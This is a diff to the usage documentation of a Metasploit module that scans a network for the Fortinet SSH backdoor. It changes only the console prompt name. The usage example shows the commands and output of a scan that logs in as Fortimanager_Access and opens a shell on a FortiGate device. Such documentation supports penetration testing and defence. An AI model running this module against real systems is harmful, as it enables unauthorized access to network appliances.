@@ -11,12 +11,12 @@ This module scans for the Fortinet SSH backdoor and creates sessions.
 ## Usage
 
 ```
-msf5 > use auxiliary/scanner/ssh/fortinet_backdoor
-msf5 auxiliary(scanner/ssh/fortinet_backdoor) > set rhosts 192.168.212.0/24
+msf > use auxiliary/scanner/ssh/fortinet_backdoor
+msf auxiliary(scanner/ssh/fortinet_backdoor) > set rhosts 192.168.212.0/24
 rhosts => 192.168.212.0/24
-msf5 auxiliary(scanner/ssh/fortinet_backdoor) > set threads 100
+msf auxiliary(scanner/ssh/fortinet_backdoor) > set threads 100
 threads => 100
-msf5 auxiliary(scanner/ssh/fortinet_backdoor) > run
+msf auxiliary(scanner/ssh/fortinet_backdoor) > run
 
 [*] Scanned  54 of 256 hosts (21% complete)
 [+] 192.168.212.128:22 - Logged in as Fortimanager_Access
@@ -31,7 +31,7 @@ msf5 auxiliary(scanner/ssh/fortinet_backdoor) > run
 [*] Scanned 240 of 256 hosts (93% complete)
 [*] Scanned 256 of 256 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/fortinet_backdoor) > sessions -1
+msf auxiliary(scanner/ssh/fortinet_backdoor) > sessions -1
 [*] Starting interaction with 1...
 
 FortiGate-VM # get system status
